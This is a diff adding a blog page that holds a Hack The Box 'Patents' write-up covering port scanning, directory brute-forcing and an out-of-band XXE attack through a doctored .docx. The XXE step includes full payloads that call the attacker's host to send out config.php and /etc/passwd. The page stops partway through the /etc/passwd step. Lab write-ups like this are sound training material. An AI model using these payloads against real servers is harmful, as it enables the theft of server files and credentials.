@@ -1,0 +1,762 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>Hack The Box: Patents | gr4n173</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="Hack The Box: Patents" />
+<meta name="author" content="gr4n173>" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Here I will explain my path for Patents box from Hack The Box." />
+<meta property="og:description" content="Here I will explain my path for Patents box from Hack The Box." />
+<link rel="canonical" href="http://localhost:4000/2020/05/16/htb-patents.html" />
+<meta property="og:url" content="http://localhost:4000/2020/05/16/htb-patents.html" />
+<meta property="og:site_name" content="gr4n173" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-16T00:00:00+05:45" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/2020/05/16/htb-patents.html","headline":"Hack The Box: Patents","dateModified":"2020-05-16T00:00:00+05:45","datePublished":"2020-05-16T00:00:00+05:45","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/05/16/htb-patents.html"},"author":{"@type":"Person","name":"gr4n173>"},"description":"Here I will explain my path for Patents box from Hack The Box.","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/public/images/blackflag.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="gr4n173" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">gr4n173<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://twitter.com/"><i class="fab fa-twitter"></i></a><a class="color-red-hover" href="https://gr4n173.github.io"><i class="fab fa-itch-io"></i></a><a class="color-purple-hover" href="https://github.com/gr4n173"><i class="fab fa-github"></i></a><a class="color-blue-hover" href="https://www.facebook.com/profile.php?id=100038644863435"><i class="fab fa-facebook"></i></a><a class="color-cyan-hover" href="https://discordapp.com/users/680705408297730058"><i class="fab fa-discord"></i></a><a class="color-red-hover" href="mailto:me.gr4n173@protonmail.com"><i class="fab fa-mailchimp"></i></a><a class="color-cyan-hover" href="https://www.hackthebox.eu/home/users/profile/60443"><i class="fab fa-itch-io"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+
+<img src="https://gravatar.com/avatar/6691d16a4bf77dcf1f54ee766349682a?s=256" class="author-avatar" />
+
+Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">Hack The Box: Patents</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/htb/">htb</a>
+      
+      <a class="tag" href="/tag/linux/">linux</a>
+      
+      <a class="tag" href="/tag/lfmserver/">lfmserver</a>
+      
+      <a class="tag" href="/tag/ROP/">ROP</a>
+      
+      <a class="tag" href="/tag/XXE/">XXE</a>
+      
+      <a class="tag" href="/tag/LFI-posioning/">LFI-posioning</a>
+      
+      <a class="tag" href="/tag/git/">git</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 16 May 2020</div>
+  
+  <div class="post-description">Here I will explain my path for Patents box from Hack The Box.</div>
+  
+  <h1 id="htbpatents">HTB:Patents</h1>
+
+<p>Patents was a hard Hard box. It falls under linux and hard category. Especially to get the root was the tough one where I had to build my own script to exploit the <code class="highlighter-rouge">ROP</code> in the server. And I will be describing detail about the <code class="highlighter-rouge">ROP</code> in next post stay tuned. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by 	exploiting <code class="highlighter-rouge">XXE</code> and got  <code class="highlighter-rouge">LFI</code> vulnerability api where I poised it and got a user shell. For root, I recovered the deleted files of git and exploited the <code class="highlighter-rouge">ROP</code> in elf file of lfmserver then <code class="highlighter-rouge">mount</code> to get a root flag.</p>
+
+<h1 id="box-details">Box Details</h1>
+
+<p><img src="/public/images/patents_details.png" alt="box_details" /></p>
+
+<p>In above picture IP was 10.10.10.173 and added it to <code class="highlighter-rouge">/etc/hosts/</code> as <code class="highlighter-rouge">patents.htb</code>. Let’s solve this box.</p>
+
+<h1 id="recon">Recon</h1>
+
+<p>Let’s start with our universal port scanner, nmap to see the open ports and ports <code class="highlighter-rouge">SSH(22)</code>, <code class="highlighter-rouge">HTTP(80)</code> and <code class="highlighter-rouge">lfm(8888)</code> are opened.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.80 scan initiated Tue Apr  7 12:47:04 2020 as: nmap -sS -sV -sC -Pn -oA nmap --min-rate 1000 10.10.10.173
+</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">patents</span><span class="o">.</span><span class="n">htb</span> <span class="p">(</span><span class="mf">10.10.10.173</span><span class="p">)</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.25</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+<span class="n">Not</span> <span class="n">shown</span><span class="p">:</span> <span class="mi">997</span> <span class="n">closed</span> <span class="n">ports</span>
+<span class="n">PORT</span>     <span class="n">STATE</span> <span class="n">SERVICE</span>         <span class="n">VERSION</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>             <span class="n">OpenSSH</span> <span class="mf">7.7</span><span class="n">p1</span> <span class="n">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="mf">.3</span> <span class="p">(</span><span class="n">Ubuntu</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mi">2048</span> <span class="mi">39</span><span class="p">:</span><span class="n">b6</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="n">a7</span><span class="p">:</span><span class="n">f3</span><span class="p">:</span><span class="n">c2</span><span class="p">:</span><span class="mi">4</span><span class="n">f</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">db</span><span class="p">:</span><span class="n">fc</span><span class="p">:</span><span class="mi">2</span><span class="n">a</span><span class="p">:</span><span class="n">dd</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">4</span><span class="n">e</span><span class="p">:</span><span class="mi">67</span> <span class="p">(</span><span class="n">RSA</span><span class="p">)</span>
+<span class="o">|</span>   <span class="mi">256</span> <span class="n">b1</span><span class="p">:</span><span class="n">cd</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="n">c7</span><span class="p">:</span><span class="mi">1</span><span class="n">d</span><span class="p">:</span><span class="n">df</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="n">c1</span><span class="p">:</span><span class="n">d2</span><span class="p">:</span><span class="mi">61</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="n">f5</span><span class="p">:</span><span class="mi">65</span> <span class="p">(</span><span class="n">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">73</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">88</span><span class="p">:</span><span class="mi">6</span><span class="n">a</span><span class="p">:</span><span class="mi">2</span><span class="n">e</span><span class="p">:</span><span class="n">b8</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">4</span><span class="n">e</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="n">f8</span><span class="p">:</span><span class="mi">5</span><span class="n">e</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="n">f6</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">c4</span> <span class="p">(</span><span class="n">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">http</span>            <span class="n">Apache</span> <span class="n">httpd</span> <span class="mf">2.4.29</span> <span class="p">((</span><span class="n">Ubuntu</span><span class="p">))</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Apache</span><span class="o">/</span><span class="mf">2.4.29</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">MEOW</span> <span class="n">Inc</span><span class="o">.</span> <span class="o">-</span> <span class="n">Patents</span> <span class="n">Management</span>
+<span class="mi">8888</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">sun</span><span class="o">-</span><span class="n">answerbook</span><span class="err">?</span>
+<span class="o">|</span> <span class="n">fingerprint</span><span class="o">-</span><span class="n">strings</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">Help</span><span class="p">,</span> <span class="n">LPDString</span><span class="p">,</span> <span class="n">LSCP</span><span class="p">:</span> 
+<span class="o">|</span><span class="n">_</span>    <span class="n">LFM</span> <span class="mi">400</span> <span class="n">BAD</span> <span class="n">REQUEST</span>
+<span class="mi">1</span> <span class="n">service</span> <span class="n">unrecognized</span> <span class="n">despite</span> <span class="n">returning</span> <span class="n">data</span><span class="o">.</span> <span class="n">If</span> <span class="n">you</span> <span class="n">know</span> <span class="n">the</span> <span class="n">service</span><span class="o">/</span><span class="n">version</span><span class="p">,</span> <span class="n">please</span> <span class="n">submit</span> <span class="n">the</span> <span class="n">following</span> <span class="n">fingerprint</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="nb">bin</span><span class="o">/</span><span class="n">submit</span><span class="o">.</span><span class="n">cgi</span><span class="err">?</span><span class="n">new</span><span class="o">-</span><span class="n">service</span> <span class="p">:</span>
+<span class="n">SF</span><span class="o">-</span><span class="n">Port8888</span><span class="o">-</span><span class="n">TCP</span><span class="p">:</span><span class="n">V</span><span class="o">=</span><span class="mf">7.80</span><span class="o">%</span><span class="n">I</span><span class="o">=</span><span class="mi">7</span><span class="o">%</span><span class="n">D</span><span class="o">=</span><span class="mi">4</span><span class="o">/</span><span class="mi">7</span><span class="o">%</span><span class="n">Time</span><span class="o">=</span><span class="mf">5E8</span><span class="n">C257D</span><span class="o">%</span><span class="n">P</span><span class="o">=</span><span class="n">x86_64</span><span class="o">-</span><span class="n">pc</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LSC</span>
+<span class="n">SF</span><span class="p">:</span><span class="n">P</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="s">"LFM</span><span class="se">\x20</span><span class="s">400</span><span class="se">\x20</span><span class="s">BAD</span><span class="se">\x20</span><span class="s">REQUEST</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">Help</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="s">"LFM</span><span class="se">\x20</span><span class="s">400</span><span class="se">\x20</span><span class="s">B</span><span class="err">
+</span><span class="s">SF:AD</span><span class="se">\x20</span><span class="s">REQUEST</span><span class="se">\r\n\r\n</span><span class="s">"</span><span class="p">)</span><span class="o">%</span><span class="n">r</span><span class="p">(</span><span class="n">LPDString</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="s">"LFM</span><span class="se">\x20</span><span class="s">400</span><span class="se">\x20</span><span class="s">BAD</span><span class="se">\x20</span><span class="s">REQUEST</span><span class="se">\r\
+</span><span class="s">SF:n</span><span class="se">\r\n</span><span class="s">"</span><span class="p">);</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OS</span><span class="p">:</span> <span class="n">Linux</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">linux</span><span class="p">:</span><span class="n">linux_kernel</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
+<span class="c1"># Nmap done at Tue Apr  7 12:48:57 2020 -- 1 IP address (1 host up) scanned in 112.74 seconds
+</span>
+</code></pre></div></div>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+
+<p>As soon as I saw port 80 opened I visited and got the output.</p>
+
+<p><img src="/public/images/patent_website.jpg" alt="patent_website" /></p>
+
+<p>So seems like the website was related to the patent management account of the admin user <code class="highlighter-rouge">Ajeje Brazorf</code> and found the upload as the interesting dir where I can upload the files in <code class="highlighter-rouge">docx</code> format. Besides that I searched for the more directory with <code class="highlighter-rouge">dirsearch</code> my usual tool but nothing was found there. then I used dirsearch with <code class="highlighter-rouge">raft-large-directories.txt</code> as <code class="highlighter-rouge">wordlist</code> then I got this as output.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">gobuster</span> <span class="nb">dir</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">patents</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span> <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">large</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">130</span>
+<span class="o">===============================================================</span>
+<span class="n">Gobuster</span> <span class="n">v3</span><span class="mf">.0.1</span>
+<span class="n">by</span> <span class="n">OJ</span> <span class="n">Reeves</span> <span class="p">(</span><span class="o">@</span><span class="n">TheColonial</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">Christian</span> <span class="n">Mehlmauer</span> <span class="p">(</span><span class="o">@</span><span class="n">_FireFart_</span><span class="p">)</span>
+<span class="o">===============================================================</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Url</span><span class="p">:</span>            <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">patents</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Threads</span><span class="p">:</span>        <span class="mi">130</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Wordlist</span><span class="p">:</span>       <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">large</span><span class="o">-</span><span class="n">directories</span><span class="o">.</span><span class="n">txt</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Status</span> <span class="n">codes</span><span class="p">:</span>   <span class="mi">200</span><span class="p">,</span><span class="mi">204</span><span class="p">,</span><span class="mi">301</span><span class="p">,</span><span class="mi">302</span><span class="p">,</span><span class="mi">307</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">403</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">User</span> <span class="n">Agent</span><span class="p">:</span>     <span class="n">gobuster</span><span class="o">/</span><span class="mf">3.0.1</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Timeout</span><span class="p">:</span>        <span class="mi">10</span><span class="n">s</span>
+<span class="o">===============================================================</span>
+<span class="mi">2020</span><span class="o">/</span><span class="mi">05</span><span class="o">/</span><span class="mi">16</span> <span class="mi">13</span><span class="p">:</span><span class="mi">01</span><span class="p">:</span><span class="mi">36</span> <span class="n">Starting</span> <span class="n">gobuster</span>
+<span class="o">===============================================================</span>
+<span class="o">/</span><span class="n">upload</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span>
+<span class="o">/</span><span class="n">uploads</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span>
+<span class="o">/</span><span class="n">profile</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span>
+<span class="o">/</span><span class="n">index</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">200</span><span class="p">)</span>
+<span class="o">/</span><span class="n">patents</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span>
+<span class="o">/</span><span class="n">static</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span>
+<span class="o">/</span><span class="n">vendor</span>	<span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span>
+<span class="o">/</span><span class="n">output</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span>
+<span class="o">/</span><span class="n">release</span> <span class="p">(</span><span class="n">Status</span><span class="p">:</span> <span class="mi">301</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>And then I used same in directory inside every <code class="highlighter-rouge">301</code> responses but nothing found and at last I used the <code class="highlighter-rouge">raft-large-words.txt</code> directory which took a long time but valid directory was found.
+<code class="highlighter-rouge">/releases/UpdateDetails</code>. Then I visited and got this as output.</p>
+
+<p><img src="/public/images/patents_release_updated.jpg" alt="patents_uploads" /></p>
+
+<p>This website gave me the full description about the <code class="highlighter-rouge">Docx2Pdf</code> upload feature and it’s vulnerability especially</p>
+
+<ol>
+  <li>Directory traversal</li>
+  <li>Local file inclusion (parameter)</li>
+</ol>
+
+<p>which was eye catching one.</p>
+
+<h3 id="file-upload-to-xxe">File upload to XXE</h3>
+
+<p>As upload feature was <code class="highlighter-rouge">doc2pdf</code> so first thing that comes in my mind after seeing the <code class="highlighter-rouge">.doc</code> format was only about the XXE vulnerability.  I first tried by uploading the normal <code class="highlighter-rouge">.docx</code> file and I found a <code class="highlighter-rouge">pdf</code> file of that docx file to check if that upload function is working or not. Then I used <code class="highlighter-rouge">Exploiting XXE using Out-Of-Band(OOB) technique</code>. Let me explain with the steps that I used to create the payload, at first I created a payload in <code class="highlighter-rouge">defaultXml</code> files and uploaded but unable to exploit so I used the <code class="highlighter-rouge">customXml file</code> to create my payload and that way worked. To learn more about <code class="highlighter-rouge">XXE</code> visit <a href="https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-exfiltrate-data-out-of-band">Portswigger</a>.</p>
+
+<blockquote>
+  <p>Unzipped the .docx</p>
+</blockquote>
+
+<blockquote>
+  <p>Creating the payload</p>
+</blockquote>
+
+<blockquote>
+  <p>Zipped the same file</p>
+</blockquote>
+
+<h4 id="unzip-docx-file">Unzip .docx file</h4>
+
+<p>At first I unzipped the file with command and got the following dir as</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="o">~</span><span class="err">$</span> <span class="n">unzip</span> <span class="o">-</span><span class="n">u</span> <span class="nb">file</span><span class="o">.</span><span class="n">docx</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">word</span><span class="o">/</span><span class="n">numbering</span><span class="o">.</span><span class="n">xml</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">word</span><span class="o">/</span><span class="n">_rels</span><span class="o">/</span><span class="n">fontTable</span><span class="o">.</span><span class="n">xml</span><span class="o">.</span><span class="n">rels</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">_rels</span><span class="o">/.</span><span class="n">rels</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="p">[</span><span class="n">Content_Types</span><span class="p">]</span><span class="o">.</span><span class="n">xml</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">DS_Store</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">docProps</span><span class="o">/</span><span class="n">app</span><span class="o">.</span><span class="n">xml</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">docProps</span><span class="o">/</span><span class="n">core</span><span class="o">.</span><span class="n">xml</span>
+<span class="n">inflating</span><span class="p">:</span> <span class="n">dtd</span><span class="o">.</span><span class="n">xml</span>
+</code></pre></div></div>
+
+<h4 id="creating-the-payload">Creating the payload</h4>
+
+<p>I created the payload in <code class="highlighter-rouge">customXml folder</code> where I used the paramter entity(%) as regular entity(&amp;) didn’t worked at first.</p>
+
+<p><strong>/customXml/item1.xml</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span> <span class="n">version</span><span class="o">=</span><span class="s">"1.0"</span> <span class="err">?</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="n">DOCTYPE</span> <span class="n">r</span> <span class="p">[</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="n">ELEMENT</span> <span class="n">r</span> <span class="n">ANY</span> <span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="err">!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">sys</span> <span class="n">SYSTEM</span> <span class="s">"http://10.10.14.32:8000/dtd.xml"</span><span class="o">&gt;</span>
+<span class="o">%</span><span class="n">sys</span><span class="p">;</span>
+<span class="o">%</span><span class="n">res</span><span class="p">;</span>
+<span class="p">]</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">r</span><span class="o">&gt;&amp;</span><span class="n">exfil</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">r</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>Then I edited the <code class="highlighter-rouge">dtd.xml</code> files with <code class="highlighter-rouge">php wrapper</code> inside it to read the <code class="highlighter-rouge">config.php</code> file as that <code class="highlighter-rouge">Web</code>  was vulnerable to <code class="highlighter-rouge">LFI</code>.</p>
+
+<p><strong>dtd.xml</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="err">!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">data</span> <span class="n">SYSTEM</span> <span class="s">"php://filter/convert.base64-encode/resource=config.php"</span><span class="o">&gt;</span> 
+<span class="o">&lt;</span><span class="err">!</span><span class="n">ENTITY</span> <span class="o">%</span> <span class="n">res</span> <span class="s">"&lt;!ENTITY exfil SYSTEM 'http://10.10.14.32:8000/dtd.xml?</span><span class="si">%</span><span class="s">data;'&gt;"</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<h4 id="zipped-the-file">Zipped the file</h4>
+
+<p>At last I zipped the file with my payload inside it</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="nb">zip</span> <span class="o">-</span><span class="n">u</span> <span class="n">TES</span><span class="o">-</span><span class="mf">4.</span><span class="n">docx</span> <span class="n">customXml</span><span class="o">/</span><span class="n">item1</span><span class="o">.</span><span class="n">xml</span>
+</code></pre></div></div>
+
+<p>After zipped the <code class="highlighter-rouge">.docx</code> file I uploaded the file with <code class="highlighter-rouge">python server on</code> in dir of <code class="highlighter-rouge">dtd.xml</code> file then I got the response in python server in base64 encoded format.</p>
+
+<p><strong>Python3 Server on</strong></p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">8000</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.10.173</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">16</span><span class="o">/</span><span class="n">May</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">14</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">25</span><span class="p">]</span> <span class="s">"GET /dtd.xml HTTP/1.0"</span> <span class="mi">200</span> <span class="o">-</span>
+<span class="mf">10.10.10.173</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">16</span><span class="o">/</span><span class="n">May</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">14</span><span class="p">:</span><span class="mi">02</span><span class="p">:</span><span class="mi">26</span><span class="p">]</span> <span class="s">"GET /dtd.xml?PD9waHAKIyBuZWVkZWQgYnkgY29udmVydC5waHAKJHVwbG9hZGlyID0gJ2xldHNnby8nOwoKIyBuZWVkZWQgYnkgZ2V0UGF0ZW50LnBocAojIGdieW9sbzogSSBtb3ZlZCBnZXRQYXRlbnQucGhwIHRvIGdldFBhdGVudF9hbHBoYXYxLjAucGhwIGJlY2F1c2UgaXQncyB2dWxuZXJhYmxlCmRlZmluZSgnUEFURU5UU19ESVInLCAnL3BhdGVudHMvJyk7Cj8+Cgo= HTTP/1.0"</span> <span class="mi">200</span> <span class="o">-</span>
+</code></pre></div></div>
+<p>As we used the <code class="highlighter-rouge">php wrapper</code> inside the file <code class="highlighter-rouge">dtd.xml</code> to read a <code class="highlighter-rouge">config.php</code> file so we got the configuration after decoding.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="o">~</span><span class="err">$</span> <span class="n">echo</span> <span class="s">"PD9waHAKIyBuZWVkZWQgYnkgY29udmVydC5waHAKJHVwbG9hZGlyID0gJ2xldHNnby8nOwoKIyBuZWVkZWQgYnkgZ2V0UGF0ZW50LnBocAojIGdieW9sbzogSSBtb3ZlZCBnZXRQYXRlbnQucGhwIHRvIGdldFBhdGVudF9hbHBoYXYxLjAucGhwIGJlY2F1c2UgaXQncyB2dWxuZXJhYmxlCmRlZmluZSgnUEFURU5UU19ESVInLCAnL3BhdGVudHMvJyk7Cj8+Cgo="</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span>
+<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<span class="c1"># needed by convert.php
+</span><span class="err">$</span><span class="n">uploadir</span> <span class="o">=</span> <span class="s">'letsgo/'</span><span class="p">;</span>
+
+<span class="c1"># needed by getPatent.php
+# gbyolo: I moved getPatent.php to getPatent_alphav1.0.php because it's vulnerable
+</span><span class="n">define</span><span class="p">(</span><span class="s">'PATENTS_DIR'</span><span class="p">,</span> <span class="s">'/patents/'</span><span class="p">);</span>
+<span class="err">?</span><span class="o">&gt;</span>
+</code></pre></div></div>
+<p>Here I found the dir <code class="highlighter-rouge">getPatent_alphav1.0.php</code> inside the dir <code class="highlighter-rouge">/patents/</code>. This indicated exploit for XXE vulnerability was succeed so I tried reading the <code class="highlighter-rouge">/etc/passwd</code> file for that I just changed the file <code class="highlighter-rouge">dtd.xml</code> as</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">gr4n173</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span>
+<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">8000</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">8000</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<span class="mf">10.10.10.173</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">16</span><span class="o">/</span><span class="n">May</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">14</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">57</span><span class="p">]</span> <span class="s">"GET /dtd.xml HTTP/1.0"</span> <span class="mi">200</span> <span class="o">-</span>
